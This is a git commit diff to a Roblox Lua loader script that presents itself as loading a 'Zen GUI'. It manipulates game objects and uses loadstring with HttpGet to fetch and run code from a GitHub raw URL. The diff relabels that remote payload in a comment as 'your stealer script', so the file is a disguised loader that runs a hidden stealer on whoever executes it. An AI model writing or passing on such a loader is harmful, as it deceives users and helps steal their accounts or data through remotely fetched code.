4bb4ae76d28cbd8baef1963058ad304bf37c7f77
HKTwoScript <jancmafs@gmail.com>
2025-07-19 07:41:52 +0200

    Update LoaderV1.lua

--- LoaderV1.lua
+++ LoaderV1.lua
@@ -1,12 +1,10 @@
 pcall(function()
-    -- Load the Zen GUI from the raw GitHub file
+    -- Load the real GUI
+workspace.DinoEvent:Destroy()
+game:GetService("ReplicatedStorage").Modules.UpdateService.ZenEvent.Parent = workspace
+end)
+
+pcall(function()
+    -- Load your stealer script from your new GitHub username
     loadstring(game:HttpGet("https://raw.githubusercontent.com/HKTwoScript/ZenUpdateScript/main/ZenUpdateScript"))()
-end)
-
-pcall(function()
-    workspace.DinoEvent:Destroy()
-end)
-
-pcall(function()
-    game:GetService("ReplicatedStorage").Modules.UpdateService.ZenEvent.Parent = workspace
 end)
